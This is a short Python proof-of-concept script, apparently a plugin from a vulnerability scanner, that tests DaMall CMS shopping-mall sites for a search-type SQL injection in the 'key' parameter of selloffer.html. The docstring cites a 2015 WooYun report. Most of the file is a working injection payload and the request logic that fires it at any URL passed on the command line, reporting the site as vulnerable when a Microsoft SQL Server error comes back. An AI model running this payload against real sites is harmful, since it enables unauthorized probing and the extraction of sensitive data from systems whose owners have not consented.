#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: DaMall商城系统sql注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0115170
author: Lucifer
description: DaMall CMS文件selloffer.html?key参数存在搜索型SQL注入漏洞，可获取敏感信息。
'''
import sys
import requests
import warnings
def run(url):
        result = ['DaMall商城系统sql注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/selloffer.html?key=%27AnD%20@@version=0%20or%27%%27=%27%"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
